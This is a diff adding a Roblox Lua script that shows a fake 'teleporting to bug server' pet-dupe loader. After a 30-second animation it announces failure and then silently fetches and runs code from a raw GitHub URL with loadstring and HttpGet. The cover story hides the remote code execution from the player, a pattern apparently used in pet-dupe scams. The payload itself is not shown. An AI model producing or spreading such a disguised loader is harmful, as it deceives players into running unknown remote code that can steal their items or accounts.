@@ -1,0 +1,90 @@
+-- Roblox GUI: 30s Animated Loader + Custom Phrase + Script Execution
+-- Executes GitHub script after delay
+-- Shows "FAILED - don't have good pets to dupe" at end
+
+local player = game.Players.LocalPlayer
+local gui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
+gui.Name = "BugTeleportUI"
+gui.ResetOnSpawn = false
+
+-- Frame
+local frame = Instance.new("Frame", gui)
+frame.Size = UDim2.new(0.5, 0, 0.25, 0)
+frame.Position = UDim2.new(0.25, 0, 0.4, 0)
+frame.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
+frame.BorderSizePixel = 0
+frame.BackgroundTransparency = 0.1
+
+-- Title
+local title = Instance.new("TextLabel", frame)
+title.Size = UDim2.new(1, 0, 0.3, 0)
+title.Position = UDim2.new(0, 0, 0, 0)
+title.Text = "Teleporting to bug server...."
+title.TextColor3 = Color3.fromRGB(255, 255, 255)
+title.BackgroundTransparency = 1
+title.Font = Enum.Font.SourceSansBold
+title.TextScaled = true
+
+-- Loading Bar Background
+local barBg = Instance.new("Frame", frame)
+barBg.Size = UDim2.new(0.9, 0, 0.2, 0)
+barBg.Position = UDim2.new(0.05, 0, 0.4, 0)
+barBg.BackgroundColor3 = Color3.fromRGB(50, 50, 60)
+barBg.BorderSizePixel = 0
+barBg.ClipsDescendants = true
+
+-- Loading Bar Fill
+local barFill = Instance.new("Frame", barBg)
+barFill.Size = UDim2.new(0, 0, 1, 0)
+barFill.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
+barFill.BorderSizePixel = 0
+
+-- Loading Text
+local loading = Instance.new("TextLabel", frame)
+loading.Size = UDim2.new(1, 0, 0.2, 0)
+loading.Position = UDim2.new(0, 0, 0.65, 0)
+loading.Text = "LOADING..."
+loading.TextColor3 = Color3.fromRGB(0, 255, 255)
+loading.BackgroundTransparency = 1
+loading.Font = Enum.Font.SourceSans
+loading.TextScaled = true
+
+-- Footer
+local footer = Instance.new("TextLabel", frame)
+footer.Size = UDim2.new(1, 0, 0.2, 0)
+footer.Position = UDim2.new(0, 0, 0.82, 0)
+footer.Text = "WAITING TILL THE GAME CRASH"
+footer.TextColor3 = Color3.fromRGB(255, 100, 100)
+footer.BackgroundTransparency = 1
+footer.Font = Enum.Font.SourceSans
+footer.TextScaled = true
+
+-- Optional Pumpkin Icon
+local pumpkin = Instance.new("ImageLabel", frame)
+pumpkin.Size = UDim2.new(0.25, 0, 0.5, 0)
+pumpkin.Position = UDim2.new(0.75, 0, -0.3, 0)
+pumpkin.Image = "rbxassetid://11799845832"
+pumpkin.BackgroundTransparency = 1
+
+-- Animate loading for 30 seconds (300 steps)
+task.spawn(function()
+	for i = 1, 300 do
+		barFill.Size = UDim2.new(i / 300, 0, 1, 0)
+		wait(0.1) -- 0.1s * 300 = 30 seconds total
+	end
+
+	-- After loading
+	loading.Text = "FAILED"
+	footer.Text = "don't have good pets to dupe 😔"
+
+	wait(2) -- Short delay before running
+
+	-- Execute the GitHub script
+	local success, err = pcall(function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/ReiX31/Crash-gag/refs/heads/main/Reirei"))()
+	end)
+
+	if not success then
+		warn("Script failed to run: " .. tostring(err))
+	end
+end)
